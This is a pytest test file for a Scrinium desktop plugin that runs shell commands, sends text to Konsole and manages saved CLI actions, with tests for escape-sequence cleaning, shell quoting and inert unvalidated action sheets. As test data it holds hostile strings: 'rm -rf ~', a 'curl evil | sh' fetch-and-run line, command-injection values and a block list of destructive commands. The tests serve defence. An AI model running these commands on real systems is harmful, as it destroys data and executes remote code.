# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 Jean-François Kneib
"""Extension « Capture et console » : exécution de commandes, envoi vers Konsole (faux qdbus), repli presse-papiers."""
import importlib.util
import os
import shutil
import stat
import sys
import time
from pathlib import Path

import pytest

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
pytest.importorskip("PyQt6")
from PyQt6.QtWidgets import QApplication  # noqa: E402

from scrinium.core.paths import Paths  # noqa: E402
from scrinium.core.store import Store  # noqa: E402
from scrinium.ui.fenetre import Fenetre  # noqa: E402

RACINE = Path(__file__).resolve().parent.parent / "plugins" / "capture"
_spec = importlib.util.spec_from_file_location("capture_logique", RACINE / "logique.py")
lg = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(lg)

FAUX_QDBUS = '''#!/usr/bin/env python3
import os, sys
a = sys.argv[1:]
d = os.environ["FAUX_DIR"]
sessions = [l.split() for l in open(d + "/sessions").read().splitlines() if l.strip()]   # "service numero titre"
if not a:
    print("\\n".join(" " + s for s in sorted({x[0] for x in sessions})))
elif len(a) == 1:
    print("/\\n/Sessions\\n" + "\\n".join("/Sessions/%s" % x[1] for x in sessions if x[0] == a[0]) + "\\n/Windows")
elif a[0] == "org.kde.KWin":                      # gestionnaire de fenêtres : scripts de mise au premier plan
    if os.path.exists(d + "/sans_kwin"):
        print("Error: org.freedesktop.DBus.Error.ServiceUnknown")
        sys.exit(2)
    if a[2].endswith(".loadScript"):
        open(d + "/focus-script", "w").write(open(a[3]).read())
        print(7)
    elif a[2].endswith(".Script.run"):
        open(d + "/focus-lance", "a").write("1\\n")
    elif a[2].endswith(".unloadScript"):
        print("true")
else:
    svc, obj, meth = a[0], a[1], a[2]
    n = obj.rsplit("/", 1)[1]
    if meth.endswith(".title"):
        print(next(x[2] for x in sessions if x[0] == svc and x[1] == n))
    elif meth.endswith(".foregroundProcessId"):
        print(os.environ["FAUX_PID"])
    elif meth.endswith(".sendText"):
        if os.path.exists(d + "/refus"):
            print("Error: org.freedesktop.DBus.Error.AccessDenied")      # comme le vrai qdbus6 : sur la sortie standard
            print("L'API « D-Bus » de confidentialité pour la sécurité est désactivée dans la configuration.")
            sys.exit(2)
        open(d + "/envois", "a").write(repr((svc, n, a[3])) + "\\n")
'''


FAUX_KONSOLE = '''#!/usr/bin/env python3
import os, signal, sys, time
d = os.environ["FAUX_DIR"]
open(d + "/pids", "a").write("%d\\n" % os.getpid())          # pour que les tests puissent toujours l'arrêter
open(d + "/lancements", "a").write(" ".join(sys.argv[1:]) + "\\n")
ligne = "org.kde.konsole-%d 1 Scrinium\\n" % os.getpid()
open(d + "/sessions", "a").write(ligne)
def fin(*a):
    open(d + "/sessions", "w").write(open(d + "/sessions").read().replace(ligne, ""))
    sys.exit(0)
signal.signal(signal.SIGTERM, fin)
while True:
    time.sleep(0.1)
'''


@pytest.fixture(scope="module")
def app():
    return QApplication.instance() or QApplication([])


# ---------- logique ----------
def test_nettoyer_pour_console():
    assert lg.nettoyer_pour_console("ls -la\r\nps\n\n") == "ls -la\nps"
    sale = "echo a\x1b[201~; rm -rf ~\x03\x07\x00\x7f\x9b tab\there"
    propre = lg.nettoyer_pour_console(sale)
    assert "\x1b" not in propre and "\x03" not in propre and "\x7f" not in propre and "\t" in propre
    assert propre.startswith("echo a[201~; rm")                      # plus de séquence d'échappement : texte inerte
    assert lg.nettoyer_pour_console("a\u2028b") == "a\nb"


def test_charge_utile_collage_seulement_si_plusieurs_lignes():
    assert lg.charge_utile("une seule ligne") == "une seule ligne"
    assert lg.charge_utile("a\nb") == "\x1b[200~a\nb\x1b[201~"


def test_executer():
    code, sortie, tronque, depasse = lg.executer("echo bonjour; echo erreur >&2; exit 3")
    assert (code, tronque, depasse) == (3, False, False) and "bonjour" in sortie and "erreur" in sortie
    code, sortie, tronque, depasse = lg.executer("echo début; sleep 5", delai=1)
    assert depasse and code is None
    code, sortie, tronque, depasse = lg.executer("head -c 5000 /dev/zero | tr '\\0' x", taille_max=100)
    assert tronque and len(sortie) == 100
    assert lg.executer("cat")[1] == ""                                     # l'entrée standard est fermée : jamais d'attente


@pytest.fixture
def faux(tmp_path, monkeypatch):
    bin_ = tmp_path / "bin"
    bin_.mkdir()
    q = bin_ / "qdbus6"
    q.write_text(FAUX_QDBUS)
    q.chmod(q.stat().st_mode | stat.S_IEXEC)
    k = bin_ / "konsole"
    k.write_text(FAUX_KONSOLE)
    k.chmod(k.stat().st_mode | stat.S_IEXEC)
    d = tmp_path / "faux"
    d.mkdir()
    (d / "sessions").write_text("org.kde.konsole-111 1 claude : bash\n")        # une console de l'utilisateur, déjà ouverte
    monkeypatch.setenv("FAUX_DIR", str(d))
    monkeypatch.setenv("FAUX_PID", str(os.getpid()))
    monkeypatch.setenv("PATH", f"{bin_}{os.pathsep}{os.environ['PATH']}")
    yield d
    pids = d / "pids"                                                                  # ne laisse aucun faux Konsole derrière soi
    for pid in (pids.read_text().split() if pids.exists() else []):
        try:
            os.kill(int(pid), 15)
        except OSError:
            pass


def envois(d):
    f = d / "envois"
    tous = [eval(x) for x in f.read_text().splitlines()] if f.exists() else []
    return [e for e in tous if e[2] != ""]                      # un envoi de texte vide est une sonde, pas un envoi


def test_sessions_et_envoi(faux):
    (faux / "sessions").write_text("org.kde.konsole-111 1 admin\norg.kde.konsole-111 2 build\norg.kde.konsole-222 1 ssh\n")
    q = lg.trouver_qdbus()
    s = lg.sessions_konsole(q)
    assert [(x[0], x[1]) for x in s] == [("org.kde.konsole-111", 1), ("org.kde.konsole-111", 2), ("org.kde.konsole-222", 1)]
    assert s[0][2].startswith("admin — ") and "[" in s[0][2]                  # titre, dossier courant, programme
    lg.envoyer(q, "org.kde.konsole-111", 2, "echo un")
    lg.envoyer(q, "org.kde.konsole-222", 1, "a\nb")
    assert envois(faux) == [("org.kde.konsole-111", "2", "echo un"), ("org.kde.konsole-222", "1", "\x1b[200~a\nb\x1b[201~")]
    (faux / "refus").write_text("")
    with pytest.raises(lg.AccesRefuse):
        lg.envoyer(q, "org.kde.konsole-111", 1, "x")


# ---------- dans la fenêtre ----------
@pytest.fixture
def fen(app, tmp_path, monkeypatch, faux):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg"))
    s = Store(Paths(tmp_path / "am"))
    s.sauver_reglages(recovery_asked=True, plugins={"capture": {"migrees": True}})
    shutil.copytree(RACINE, s.paths.base / "plugins" / "capture")
    w = Fenetre(s)
    w.plugins.decouvrir()
    assert w.plugins.activer("capture"), w.plugins.infos["capture"].erreur
    w.nouvelle_fiche()
    w.titre.setText("Notes")
    w.texte.setPlainText("ls -la\nps aux")
    w.sauver()
    monkeypatch.setattr(QApplication, "activeWindow", staticmethod(lambda: None))
    yield w
    w.quitter_vraiment = True
    w.close()


def plugin(fen):
    return fen.plugins.actifs["capture"][0]


def mod():
    return sys.modules["scrinium_plugin_capture"]


def selectionner(fen, texte=None):
    if texte is not None:
        fen.texte.setPlainText(texte)
    fen.texte.selectAll()


def test_sans_selection_rien_ne_part(fen, faux):
    fen.texte.moveCursor(fen.texte.textCursor().MoveOperation.Start)
    plugin(fen).vers_console()
    assert envois(faux) == []


def lancements(d):
    f = d / "lancements"
    return f.read_text().splitlines() if f.exists() else []


def pid_dedie(d):
    return next(int(x.split()[0].rsplit("-", 1)[-1]) for x in (d / "sessions").read_text().splitlines() if x.endswith("Scrinium"))


def test_ouvre_sa_propre_console_puis_la_reutilise(fen, faux):
    selectionner(fen)
    plugin(fen).vers_console()
    assert len(lancements(faux)) == 1 and "--separate" in lancements(faux)[0] and "tabtitle=Scrinium" in lancements(faux)[0]
    dedie = f"org.kde.konsole-{pid_dedie(faux)}"
    assert envois(faux) == [(dedie, "1", "\x1b[200~ls -la\nps aux\x1b[201~")]      # multi-ligne : collage, pas d'exécution
    assert all(e[0] != "org.kde.konsole-111" for e in envois(faux))                   # la console de l'utilisateur n'est pas touchée
    selectionner(fen, "ip a")
    plugin(fen).vers_console()
    assert len(lancements(faux)) == 1 and envois(faux)[-1] == (dedie, "1", "ip a")    # même console, pas de retour à la ligne final


def test_console_fermee_est_rouverte(fen, faux):
    selectionner(fen, "un")
    plugin(fen).vers_console()
    premier = pid_dedie(faux)
    os.kill(premier, 15)                                                               # l'utilisateur ferme la console
    fin = time.time() + 5
    while f"konsole-{premier}" in (faux / "sessions").read_text() and time.time() < fin:
        time.sleep(0.05)
    selectionner(fen, "deux")
    plugin(fen).vers_console()
    assert len(lancements(faux)) == 2 and pid_dedie(faux) != premier
    assert envois(faux)[-1] == (f"org.kde.konsole-{pid_dedie(faux)}", "1", "deux")


def test_console_retrouvee_apres_redemarrage_de_scrinium(fen, faux):
    selectionner(fen, "un")
    plugin(fen).vers_console()
    plugin(fen).pid_dedie = None                                                       # nouveau démarrage : seule la mémoire disque reste
    selectionner(fen, "deux")
    plugin(fen).vers_console()
    assert len(lancements(faux)) == 1 and envois(faux)[-1][2] == "deux"


def test_console_choisie_a_la_main_prioritaire_puis_retour_a_celle_de_l_extension(fen, faux, monkeypatch):
    monkeypatch.setattr(mod().QInputDialog, "getItem", staticmethod(lambda p, t, m, libelles, d, e: (libelles[0], True)))
    plugin(fen).choisir_cible()                                                        # « claude : bash » (n° 111)
    assert plugin(fen).cible == ("org.kde.konsole-111", 1)
    selectionner(fen, "echo ok")
    plugin(fen).vers_console()
    assert envois(faux)[-1][:2] == ("org.kde.konsole-111", "1") and lancements(faux) == []
    plugin(fen).oublier_cible()
    plugin(fen).vers_console()
    assert len(lancements(faux)) == 1 and envois(faux)[-1][0] != "org.kde.konsole-111"


def test_cible_disparue_retombe_sur_la_console_de_l_extension(fen, faux, monkeypatch):
    monkeypatch.setattr(mod().QInputDialog, "getItem", staticmethod(lambda p, t, m, libelles, d, e: (libelles[0], True)))
    plugin(fen).choisir_cible()
    (faux / "sessions").write_text("")                                                 # la console choisie est fermée
    selectionner(fen, "make")
    plugin(fen).vers_console()
    assert len(lancements(faux)) == 1 and envois(faux)[-1][0] != "org.kde.konsole-111"


def test_acces_refuse_copie_explique_une_fois_et_n_ouvre_pas_de_console_inutile(fen, faux, monkeypatch):
    (faux / "refus").write_text("")
    infos = []
    monkeypatch.setattr(mod().QMessageBox, "information", lambda *a, **k: infos.append(a[2]))
    selectionner(fen, "uname -a")
    plugin(fen).vers_console()
    assert QApplication.clipboard().text() == "uname -a" and len(infos) == 1 and "DBus" in infos[0]
    assert lancements(faux) == [] and envois(faux) == []                  # la sonde a suffi : aucune console ouverte pour rien
    selectionner(fen, "date")
    plugin(fen).vers_console()
    assert QApplication.clipboard().text() == "date" and len(infos) == 1 and lancements(faux) == []   # explication donnée une fois


def test_refus_avec_la_console_de_l_extension_deja_ouverte(fen, faux, monkeypatch):
    selectionner(fen, "un")
    plugin(fen).vers_console()                                            # autorisé : la console de l'extension s'ouvre
    assert len(lancements(faux)) == 1
    (faux / "refus").write_text("")                                       # l'option est ensuite désactivée dans Konsole
    monkeypatch.setattr(mod().QMessageBox, "information", lambda *a, **k: None)
    selectionner(fen, "deux")
    plugin(fen).vers_console()
    assert QApplication.clipboard().text() == "deux" and len(lancements(faux)) == 1


def test_refus_aucune_console_ouverte_ouvre_celle_de_l_extension_puis_n_insiste_pas(fen, faux, monkeypatch):
    (faux / "sessions").write_text("")                                    # aucune console ouverte : pas de sonde possible
    (faux / "refus").write_text("")
    monkeypatch.setattr(mod().QMessageBox, "information", lambda *a, **k: None)
    selectionner(fen, "un")
    plugin(fen).vers_console()
    assert len(lancements(faux)) == 1 and QApplication.clipboard().text() == "un"      # la console ouverte sert de sonde
    (faux / "sessions").write_text("")
    selectionner(fen, "deux")
    plugin(fen).vers_console()
    assert len(lancements(faux)) == 1 and QApplication.clipboard().text() == "deux"    # pas de seconde console pour rien


def test_reessayer_apres_les_reglages(fen, faux, monkeypatch):
    (faux / "refus").write_text("")
    monkeypatch.setattr(mod().QMessageBox, "information", lambda *a, **k: None)
    selectionner(fen, "un")
    plugin(fen).vers_console()
    assert plugin(fen).refus_vu and lancements(faux) == []
    (faux / "refus").unlink()                                             # l'utilisateur active l'option dans Konsole
    d = mod().DialogueReglages(plugin(fen))
    d._valider()                                                          # enregistrer les réglages remet le compteur à zéro
    selectionner(fen, "deux")
    plugin(fen).vers_console()
    assert len(lancements(faux)) == 1 and envois(faux)[-1][2] == "deux"


def test_logique_reconnait_le_refus_sur_stdout_comme_sur_stderr(faux, monkeypatch):
    q = lg.trouver_qdbus()
    (faux / "refus").write_text("")
    with pytest.raises(lg.AccesRefuse):
        lg.envoyer(q, "org.kde.konsole-111", 1, "x")                      # le faux qdbus écrit sur stdout, comme le vrai
    import subprocess as sp
    monkeypatch.setattr(lg, "_qdbus", lambda *a: sp.CompletedProcess(a, 2, b"", b"Error: org.freedesktop.DBus.Error.AccessDenied"))
    with pytest.raises(lg.AccesRefuse):
        lg.envoyer(q, "org.kde.konsole-111", 1, "x")                      # et sur stderr si une autre version le fait


def test_sans_konsole_ou_sans_qdbus_presse_papiers(fen, faux, monkeypatch):
    selectionner(fen, "date")
    monkeypatch.setattr(mod().logique, "lancer_konsole", lambda: None)                 # Konsole non installé
    plugin(fen).vers_console()
    assert QApplication.clipboard().text() == "date" and envois(faux) == []
    QApplication.clipboard().setText("")
    monkeypatch.setattr(mod().logique, "trouver_qdbus", lambda: None)
    plugin(fen).vers_console()
    assert QApplication.clipboard().text() == "date" and envois(faux) == []


def test_option_directe_desactivee(fen, faux):
    fen.plugins.actifs["capture"][1].reglages.set("direct", False)
    selectionner(fen, "df -h")
    plugin(fen).vers_console()
    assert envois(faux) == [] and QApplication.clipboard().text() == "df -h"


def test_dialogue_commande_insere_la_sortie(fen, app):
    selectionner(fen, "début")
    fen.texte.moveCursor(fen.texte.textCursor().MoveOperation.End)
    d = mod().DialogueCommande(plugin(fen))
    d.commande.setText("echo bonjour-capture")
    d._lancer()
    fin = time.time() + 8
    while d.resultat is None and time.time() < fin:
        app.processEvents()
        time.sleep(0.01)
    assert d.resultat and "bonjour-capture" in d.sortie.toPlainText() and d.b_inserer.isEnabled()
    d._inserer()
    assert "### " in fen.texte.toPlainText() and "— echo bonjour-capture" in fen.texte.toPlainText()
    assert "bonjour-capture\n```" in fen.texte.toPlainText()


# ---------- mise au premier plan ----------
def test_script_premier_plan_cible_le_bon_processus(faux):
    q = lg.trouver_qdbus()
    assert lg.mettre_au_premier_plan(q, "org.kde.konsole-4242") is True
    js = (faux / "focus-script").read_text()
    assert "var pid = 4242;" in js and "workspace.activeWindow = w" in js and (faux / "focus-lance").exists()


def test_premier_plan_sans_kwin_ne_plante_pas(faux):
    (faux / "sans_kwin").write_text("")
    assert lg.mettre_au_premier_plan(lg.trouver_qdbus(), "org.kde.konsole-4242") is False
    assert lg.mettre_au_premier_plan(lg.trouver_qdbus(), "pas-un-service") is False


def test_console_au_premier_plan_apres_l_envoi(fen, faux):
    selectionner(fen, "ls")
    plugin(fen).vers_console()
    assert f"var pid = {pid_dedie(faux)};" in (faux / "focus-script").read_text()          # la console de l'extension est mise devant


def test_premier_plan_desactivable_et_absent_si_refus(fen, faux, monkeypatch):
    fen.plugins.actifs["capture"][1].reglages.set("premier_plan", False)
    selectionner(fen, "ls")
    plugin(fen).vers_console()
    assert envois(faux) and not (faux / "focus-script").exists()
    fen.plugins.actifs["capture"][1].reglages.set("premier_plan", True)
    (faux / "refus").write_text("")
    monkeypatch.setattr(mod().QMessageBox, "information", lambda *a, **k: None)
    plugin(fen).vers_console()                                                              # refus : rien à mettre devant
    assert not (faux / "focus-script").exists()


# ---------- actions préparées : logique ----------
def test_variables_protegees_pour_le_shell():
    assert lg.etendre("grep -rn {selection} .", "foo bar", "T", "taper") == "grep -rn foo bar ."          # relu avant validation
    assert lg.etendre("grep -rn {selection} .", "foo bar", "T", "copier") == "grep -rn foo bar ."
    pire = lg.etendre("grep {selection} f", "x; rm -rf ~ && echo $(id)", "T", "executer")
    assert pire == "grep 'x; rm -rf ~ && echo $(id)' f"                                                    # une seule « chaîne » pour le shell
    assert lg.etendre("echo {selection}", "it's", "T", "executer") == "echo 'it'\"'\"'s'"
    assert lg.etendre("echo {fiche}", "s", "Ma fiche; ls", "executer") == "echo 'Ma fiche; ls'"
    assert lg.etendre("echo {selection} {fiche}", "{fiche}", "T", "taper") == "echo {fiche} T"             # pas de double remplacement
    assert lg.utilise_selection("a {selection}") and not lg.utilise_selection("a {fiche}")


def test_executer_avec_selection_dangereuse_ne_lance_rien_de_plus(tmp_path):
    cible = tmp_path / "ne-doit-pas-exister"
    cmd = lg.etendre("echo {selection}", f"x; touch {cible}", "T", "executer")
    code, sortie, *_ = lg.executer(cmd)
    assert code == 0 and not cible.exists() and "touch" in sortie                                        # affiché, jamais exécuté


def test_normaliser_actions():
    a = lg.normaliser_action({"nom": "  Ping ", "commande": "ping -c1 x\n", "mode": "inconnu", "icone": "", "description": None})
    assert (a["nom"], a["mode"], a["icone"], a["commande"]) == ("Ping", "taper", "system-run", "ping -c1 x")
    assert lg.normaliser_action({"nom": "", "commande": "x"}) is None and lg.normaliser_action({"nom": "x", "commande": " \n"}) is None
    assert lg.normaliser_action("pas un dict") is None and lg.normaliser_liste("pas une liste") == []
    assert len(lg.normaliser_liste([{"nom": str(i), "commande": "x"} for i in range(500)])) == lg.MAX_ACTIONS
    assert len(lg.normaliser_action({"nom": "n" * 200, "commande": "c" * 9000})["commande"]) == 4000


def test_exemples_valides_et_prudents():
    assert lg.normaliser_liste(list(lg.EXEMPLES)) == list(lg.EXEMPLES)
    assert len({a["nom"] for a in lg.EXEMPLES}) == len(lg.EXEMPLES)
    assert all(a["mode"] in lg.MODES for a in lg.EXEMPLES)
    assert not any(m in a["commande"] for a in lg.EXEMPLES for m in ("rm ", "sudo", "dd ", "mkfs", ">"))   # rien de destructif


def test_export_import_aller_retour_et_refus():
    actions = [{"nom": "A", "icone": "x", "mode": "copier", "commande": "ls\npwd", "description": "d"}]
    assert lg.importer_actions(lg.exporter_actions(actions)) == actions
    for mauvais in ("pas du json", '{"autre": 1}', '[1, 2]', '{"scrinium_actions": 1, "actions": [{"nom": ""}]}'):
        with pytest.raises(ValueError):
            lg.importer_actions(mauvais)


# ---------- actions préparées : panneau et clics ----------
def test_menu_actions_cli_liste_les_exemples_et_la_vue_a_des_infobulles(fen):
    p = plugin(fen)
    assert p.actions() == list(lg.EXEMPLES) and not hasattr(p, "panneau") and not hasattr(p, "dock")
    sous = next(fn for t, fn, _ic in fen._entrees_clic_droit() if t == "Actions CLI")        # clic droit d'une fiche ordinaire
    assert [t for t, _fn, _ic in sous.fournisseur()] == [e["nom"] for e in lg.EXEMPLES]
    assert all(t != "Actions CLI" for t, _fn, _ic in fen._entrees_clic_droit("actions-cli"))   # pas dans la fiche des actions
    v = mod().VueActions()
    v.definir(p.actions())
    it = next(v.liste.item(i) for i in range(v.liste.count()) if v.liste.item(i).text().startswith("Disques"))
    tip = it.toolTip()
    assert "df -h" in tip and "Espace disque" in tip and "confirmation" in tip                          # commande, description, mode


def test_infobulle_echappe_le_html():
    tip = mod().info_action({"nom": "<b>x</b>", "description": "<i>", "commande": "echo '<script>'\n" * 9, "mode": "taper"})
    assert "<script>" not in tip and "&lt;script&gt;" in tip and "…" in tip                              # échappé, tronqué à 6 lignes


def test_clic_taper_envoie_sans_valider(fen, faux):
    selectionner(fen, "foo bar")
    plugin(fen).lancer_action({"nom": "g", "icone": "x", "mode": "taper", "commande": "grep -rn {selection} .", "description": ""})
    assert envois(faux)[-1][2] == "grep -rn foo bar ."                                                   # aucune Entrée


def test_clic_sans_selection_alors_que_l_action_en_a_besoin(fen, faux):
    fen.texte.moveCursor(fen.texte.textCursor().MoveOperation.Start)
    plugin(fen).lancer_action({"nom": "g", "icone": "x", "mode": "taper", "commande": "grep {selection} .", "description": ""})
    assert envois(faux) == [] and lancements(faux) == []


def test_clic_executer_prepare_la_commande_sans_la_lancer(fen, monkeypatch, tmp_path):
    vus = []
    monkeypatch.setattr(mod().DialogueCommande, "exec", lambda self: vus.append(self) or 0)
    cible = tmp_path / "piege"
    selectionner(fen, f"x; touch {cible}")
    plugin(fen).lancer_action({"nom": "e", "icone": "x", "mode": "executer", "commande": "echo {selection}", "description": ""})
    (d,) = vus
    assert d.commande.text().startswith("echo 'x; touch ") and d.resultat is None and not cible.exists()  # affichée, pas lancée


def test_clic_copier(fen):
    selectionner(fen, "abc")
    plugin(fen).lancer_action({"nom": "c", "icone": "x", "mode": "copier", "commande": "echo {selection} {fiche}", "description": ""})
    assert QApplication.clipboard().text() == "echo abc Notes"


def test_reglages_d_avant_servent_tant_qu_il_n_y_a_pas_de_fiche(fen):
    p = plugin(fen)
    p.ctx.reglages.set("actions", [{"nom": "Seule", "commande": "ls", "mode": "taper"}, {"nom": "", "commande": "x"}])
    assert [a["nom"] for a in p.actions()] == ["Seule"]
    p.ctx.reglages.set("actions", [])
    assert p.actions() == []                                                                            # une liste vide reste vide


def test_editeur_actions_ajouter_modifier_deplacer_supprimer(fen, monkeypatch):
    d = mod().VueActions()
    recus = []
    d.modifie.connect(lambda texte: recus.append([a["nom"] for a in lg.depuis_texte(texte)]))
    d.definir([{"nom": "A", "commande": "a"}, {"nom": "B", "commande": "b"}])
    assert recus == []                                                                                   # charger ne signale rien

    class Faux:
        def __init__(self, action=None, parent=None):
            self.action = action

        def exec(self):
            return 1

        def resultat(self):
            return {"nom": "Nouveau" if self.action is None else "A2", "icone": "x", "mode": "copier", "commande": "n", "description": ""}
    monkeypatch.setattr(mod(), "DialogueAction", Faux)
    d._ajouter()
    assert recus[-1] == ["A", "B", "Nouveau"]
    d._modifier(0)
    assert recus[-1] == ["A2", "B", "Nouveau"]
    d._deplacer(0, 1)
    assert recus[-1] == ["B", "A2", "Nouveau"] and d.liste.currentRow() == 1
    n = len(recus)
    d._deplacer(2, 1)                                                                                    # au bout : rien ne bouge
    assert len(recus) == n
    d._supprimer(0)
    assert recus[-1] == ["A2", "Nouveau"]
    d.actif = False                                                                                      # fiche non validée : lecture seule
    assert d.entrees_menu(d.rect().center()) == []
    d._modifier(0)
    d._supprimer(0)
    assert recus[-1] == ["A2", "Nouveau"]


def test_editeur_actions_exemples_export_import(fen, monkeypatch, tmp_path):
    d = mod().VueActions()
    d.definir([{"nom": "Perso", "commande": "uptime"}])
    monkeypatch.setattr(mod().QMessageBox, "question", lambda *a, **k: mod().QMessageBox.StandardButton.Yes)
    d._exemples()
    assert [a["nom"] for a in d.actions][0] == "Perso" and len(d.actions) == 1 + len(lg.EXEMPLES)
    fichier = tmp_path / "x.json"
    monkeypatch.setattr(mod().QFileDialog, "getSaveFileName", staticmethod(lambda *a, **k: (str(fichier), "")))
    d._exporter()
    d.definir([])
    monkeypatch.setattr(mod().QFileDialog, "getOpenFileName", staticmethod(lambda *a, **k: (str(fichier), "")))
    d._importer()
    assert len(d.actions) == 1 + len(lg.EXEMPLES)
    fichier.write_text("pas du json")
    avertis = []
    monkeypatch.setattr(mod().QMessageBox, "warning", lambda *a, **k: avertis.append(a[2]))
    d._importer()
    assert avertis and len(d.actions) == 1 + len(lg.EXEMPLES)                                            # import refusé, liste intacte


# ---------- « tout est fiche » : la liste vit dans des fiches #scrinium-actions-cli ----------
def _noms(p):
    return [t for t, _fn, _ic in p.entrees_actions()]


def _fiche_actions(fen, actions, titre="Actions CLI", theme="Outils"):
    """Fiche arrivée sans passer par la vue (comme un partage ou un dépôt) : jamais validée."""
    return plugin(fen).ctx.creer_fiche(theme, titre, lg.en_texte(actions))


def test_format_de_la_fiche_actions_cli():
    liste = [{"nom": "Réseau", "icone": "network-wired", "mode": "executer", "commande": "ip -br a", "description": "Interfaces."},
             {"nom": "Multi", "icone": "system-run", "mode": "taper", "commande": "for i in 1 2; do\n  echo $i\n\ndone", "description": ""},
             {"nom": "Deux points", "icone": "system-run", "mode": "copier", "commande": "echo a: b", "description": ""}]
    texte = lg.en_texte(liste)
    assert texte.startswith("#scrinium-actions-cli\n") and lg.depuis_texte(texte) == lg.normaliser_liste(liste)
    assert lg.depuis_texte("#scrinium-actions-cli\nnotes libres\n## A\ncommande: a\nmystere: z\n## SansCommande\nmode: copier\n") == \
        [{"nom": "A", "icone": "system-run", "mode": "taper", "commande": "a", "description": ""}]
    assert lg.depuis_texte("## A\nmode: inconnu\ncommande: a\n")[0]["mode"] == "taper"             # mode inconnu : le plus prudent
    assert lg.depuis_texte("") == [] and lg.depuis_texte(None) == [] and lg.depuis_texte("texte libre") == []
    assert len(lg.depuis_texte(lg.en_texte([{"nom": f"a{i}", "commande": f"c{i}"} for i in range(300)]))) == lg.MAX_ACTIONS
    assert lg.TYPE.nom == "actions-cli" and lg.TYPE.executable and lg.TYPE.marque == lg.MARQUE


def test_fiche_recue_inerte_puis_validee(fen):
    p = plugin(fen)
    v = _fiche_actions(fen, [{"nom": "Piege", "commande": "rm -rf ~", "mode": "executer"}, {"nom": "Ok", "commande": "ok"}])
    assert not p.ctx.fiche_active(v) and p.a_valider() == 1
    assert "Piege" not in _noms(p)                                                    # inerte : rien dans « Actions CLI »
    assert _noms(p) == [e["nom"] for e in lg.EXEMPLES]                                # le menu garde l'ancienne liste
    th = fen.store.theme("Outils")
    fen._afficher(th, th.fiches[0])
    vue = fen.vues_types["actions-cli"]
    assert fen.pile.currentWidget() is vue and not fen.bandeau_validation.isHidden() and vue.actif is False
    assert [a["nom"] for a in vue.actions] == ["Piege", "Ok"] and vue.entrees_menu(vue.rect().center()) == []
    fen.valider_fiche_courante()
    assert p.ctx.fiche_active(v) and p.a_valider() == 0
    assert _noms(p) == ["Piege", "Ok"] and vue.actif and vue.entrees_menu(vue.rect().center())


def test_la_fiche_modifiee_ailleurs_redevient_inerte_et_le_clic_ne_lance_rien(fen, faux):
    p = plugin(fen)
    _fiche_actions(fen, [{"nom": "Ok", "commande": "ok", "mode": "copier"}])
    th = fen.store.theme("Outils")
    f = th.fiches[0]
    fen.store.valider_fiche(th, f)
    assert _noms(p) == ["Ok"]
    entree = p.entrees_actions()[0][1]                                                # entrée du menu ouverte avant la modification
    fen.store.enregistrer(th, f, f.titre, lg.en_texte([{"nom": "Ok", "commande": "ok ; curl evil | sh", "mode": "copier"}]))
    QApplication.clipboard().setText("avant")
    entree()                                                                          # choix dans le menu affiché avant : rien ne part
    assert QApplication.clipboard().text() == "avant" and p.a_valider() == 1 and _noms(p) == [e["nom"] for e in lg.EXEMPLES]


def test_texte_ecrit_dans_la_vue_est_valide(fen):
    p = plugin(fen)
    _fiche_actions(fen, [{"nom": "Ok", "commande": "ok"}])
    th = fen.store.theme("Outils")
    fen._afficher(th, th.fiches[0])
    fen.valider_fiche_courante()
    vue = fen.vues_types["actions-cli"]
    vue.actions.append({"nom": "Neuve", "icone": "system-run", "mode": "taper", "commande": "neuve", "description": ""})
    vue._enregistrer()
    fen.sauver()
    assert "neuve" in th.fiches[0].texte and fen.store.fiche_validee(th, th.fiches[0]) and _noms(p) == ["Ok", "Neuve"]


def test_migration_des_reglages_en_fiche(fen):
    p = plugin(fen)
    notes = []
    p.ctx.ui.notifier = lambda t, m: notes.append(m)
    p.ctx.reglages.set("actions", [{"nom": "Ancienne", "commande": "ancienne\nsuite", "mode": "executer"}])
    p.ctx.reglages.set("migrees", False)
    p._migrer()
    th = fen.store.theme("Outils")
    assert th is not None and len(th.fiches) == 1 and th.fiches[0].titre == "Actions CLI"
    assert lg.depuis_texte(th.fiches[0].texte)[0]["commande"] == "ancienne\nsuite"
    assert not fen.store.fiche_validee(th, th.fiches[0]) and "validez-la" in notes[-1]     # créée inerte : à valider
    assert p.ctx.reglages.get("actions")[0]["nom"] == "Ancienne" and _noms(p) == ["Ancienne"]
    p._migrer()                                                                           # une seule fois
    assert len(th.fiches) == 1


def test_modifier_cree_la_fiche_puis_la_rouvre(fen):
    p = plugin(fen)
    p.ctx.reglages.set("migrees", True)
    p.modifier_actions()
    th = fen.store.theme("Outils")
    assert len(th.fiches) == 1 and fen.fiche is th.fiches[0] and fen.pile.currentWidget() is fen.vues_types["actions-cli"]
    assert [a["nom"] for a in lg.depuis_texte(th.fiches[0].texte)] == [e["nom"] for e in lg.EXEMPLES]   # à partir de la liste actuelle
    p.modifier_actions()
    assert len(th.fiches) == 1


def test_desactiver_retire_le_type(fen):
    from scrinium.core import types_fiche
    assert types_fiche.type_de("#scrinium-actions-cli\n") is not None and "actions-cli" in fen.vues_types
    fen.plugins.desactiver("capture")
    assert types_fiche.type_de("#scrinium-actions-cli\n") is None and "actions-cli" not in fen.vues_types


def test_dialogue_action_validation(app, monkeypatch):
    avertis = []
    monkeypatch.setattr(mod().QMessageBox, "warning", lambda *a, **k: avertis.append(a[2]))
    d = mod().DialogueAction()
    d._valider()
    assert avertis and d.result() != 1                                                                   # nom et commande obligatoires
    d.nom.setText("  Mon action ")
    d.commande.setPlainText("ls -la\ndf -h")
    d.mode.setCurrentIndex(d.mode.findData("copier"))
    d.icone.setText("icone-qui-n-existe-pas")
    d._valider()
    r = d.resultat()
    assert r["nom"] == "Mon action" and r["mode"] == "copier" and r["commande"] == "ls -la\ndf -h"
    assert mod().icone_action("icone-qui-n-existe-pas") is not None                                      # repli sur une icône par défaut


def test_clic_droit_de_la_vue_actions(fen):
    from PyQt6.QtCore import QPoint
    v = mod().VueActions()
    v.show()
    v.definir([{"nom": "A", "commande": "a"}, {"nom": "B", "commande": "b"}])
    assert [t for t, _fn, _ic in v.entrees_menu(QPoint(2, 2))][0] == "Ajouter une action…"
    pos = v.liste.mapTo(v, v.liste.visualItemRect(v.liste.item(0)).center())
    sur = {t: fn for t, fn, _ic in v.entrees_menu(pos)}
    assert {"Modifier…", "Supprimer", "Monter", "Descendre"} <= set(sur)
